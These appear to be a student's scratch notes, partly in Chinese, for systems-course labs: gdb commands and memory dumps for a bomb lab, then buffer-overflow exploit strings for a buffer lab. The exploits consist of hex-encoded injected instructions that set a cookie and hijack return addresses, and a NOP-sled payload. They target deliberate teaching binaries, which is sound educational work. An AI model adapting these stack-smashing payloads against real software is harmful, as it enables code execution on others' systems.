b phase_1
r
layout asm，layout split

p $eax x $eax  d 


x/3uh 0x54320  从内存地址0x54320读取内容，h表示以双字节为一个单位，3表示三个单位，u表示按十六进制显示
x/16ub 0x54320  从内存地址0x54320读取16Bytes的内容

x/10cb $rdi
x/10cb $rsi 

x 按十六进制格式显示变量。
d 按十进制格式显示变量。
u 按十六进制格式显示无符号整型。
o 按八进制格式显示变量。
t 按二进制格式显示变量。
a 按十六进制格式显示变量。
c 按字符格式显示变量。
f 按浮点数格式显示变量。



11111111111111111111111111111



原来ESP就是一直指向栈顶的指针,而EBP只是存取某时刻的栈顶指针,以方便对栈的操作,如获取函数参数、局部变量等。

ESP 为 32位  rsp 为 64位


comp S2 S1  =  S1-S2 与0 的比较


MOVSX 先符号扩展,再传送.
MOVZX 先零扩展,再传送.


0x7fffffffe120:	0	0	0	0	0	0	0	0
0x7fffffffe128:	0	-96	-1	-9	1	0	0	0
0x7fffffffe130:	-112-30	-1	-1	-1	127	0	0
0x7fffffffe138:	16	80	96	0	0	0	0	0
0x7fffffffe140:	16	66	96	0	0	0	0	0
0x7fffffffe148:	0	0	0	0	0	0	0	0
0x7fffffffe150:	1	0

1:0x7fffffffe120:	-48	 59	96	0	0	0	0	0:0x603bd0:-61:2c3
2:0x7fffffffe128:	-64	 59	96	0	0	0	0	0:0x603bc0:-22:490
3:0x7fffffffe130:	-80	 59	96	0	0	0	0	0:0x603bb0:-127:281
4:0x7fffffffe138:	-96	 59	96	0	0	0	0	0:0x603ba0:117
5:0x7fffffffe140:	-112 59	96	0	0	0	0	0:0x603b90:91
6:0x7fffffffe148:	-128 59	96	0	0	0	0	0:0x603b80:-74



6:0x7fffffffe148:	-128 59	96	0	0	0	0	0:0x603b80:-74:b6
2:0x7fffffffe128:	-64	 59	96	0	0	0	0	0:0x603bc0:-22:1ea
4:0x7fffffffe138:	-96	 59	96	0	0	0	0	0:0x603ba0:117:275
3:0x7fffffffe130:	-80	 59	96	0	0	0	0	0:0x603bb0:-127:281
1:0x7fffffffe120:	-48	 59	96	0	0	0	0	0:0x603bd0:-61:2c3
5:0x7fffffffe140:	-112 59	96	0	0	0	0	0:0x603b90:91:35b



  0x7fffffffe128:	0	-96	-1	-9	1	0	0	0
0x7fffffffe130:	-112	-30	-1	-1	-1	127	0	0
0x7fffffffe138:	16	80	96	0	0	0	0	0
0x7fffffffe140:	16	66	96	0	0	0	0	0
0x7fffffffe148:	0	0	0	0	0	0	0	0
0x7fffffffe150:	1	0

x/48db 0x7fffffffe120

x/20db 0x7fffffffe120


x/32db 0x603bd0

0x603bd0 <node1>:	-61	2	0	0	1	0	0	0
0x603bd8 <node1+8>:	-64	59	96	0	0	0	0	0


run -t fyuan < exploit.txt

b test

08 04 8d 3f


movl $0x6549cf23, 0x804b324
push $0x8048ca6
ret


movl $0x6549cf23, %ebx
movl $0x556835b0, %ebp
pushl $0x8048c6a
ret 

leal 0x28(%esp), %ebp
movl $0x6549cf23, %eax
pushl $0x08048c4e
ret


00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c7 05 24 b3 04 08 23 cf 49 65 68 a6 8c 04 08 c3 00 00 00 00 00 00 00 00 00 00 00 00 b8 31 68 55 

00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 bb 23 cf 49 65 bd b0 35 68 55 68 98 8d 04 08 c3 00 00 00 00 00 00 00 00 00 00 00 00 b8 31 68 55

0x556831b8

0xa8	0x31	0x68	0x55

00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f3 8c 04 08 00 00 00 00 23 cf 49 65

c7 05 24 b3 04 08 23 cf 49 65 68 a6 8c 04 08 c3
c7 05 24 b3 04 08 23 cf 49 65 68 a6 8c 04 08 c3
b8 23 cf 49 65 bd b0 35 68 55 68 7c 8d 04 08 c3
bb 23 cf 49 65 bd b0 35 68 55 68 98 8d 04 08 c3

00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 3e 8d 04 08 

90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 bb 23 cf 49 65 bd b0 35
68 55 68 6a 8c 04 08 c3 90 90 90 90 ac 30 68 55

